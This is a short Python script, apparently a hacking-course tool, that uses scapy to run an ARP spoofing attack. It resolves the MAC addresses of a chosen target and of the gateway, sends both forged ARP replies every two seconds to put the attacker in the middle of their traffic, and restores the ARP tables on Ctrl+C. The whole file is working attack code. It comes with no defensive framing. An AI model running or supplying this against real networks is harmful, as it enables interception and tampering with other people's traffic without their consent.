#!/usr/bin/env python

import optparse
import scapy.all as scapy
import time
import sys

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="set the target ip address")
    parser.add_option("-g", "--gateway", dest="gateway_ip", help="set the gateway ip address to find gateway ip address use route -n")
    options, arguments = parser.parse_args()
    return options
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answer_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answer_list[0][1].hwsrc

def spoof(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    scapy.send(packet, verbose=False)

def restore(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(packet, verbose=False)

options = get_arguments()
target_ip = options.target_ip
gateway_ip = options.gateway_ip
try:
    sent_packet_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packet_count = sent_packet_count+2
        print("\rpacket sent: " + str(sent_packet_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n detected CTRL + C.......Restoring the ARP table......please wait\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
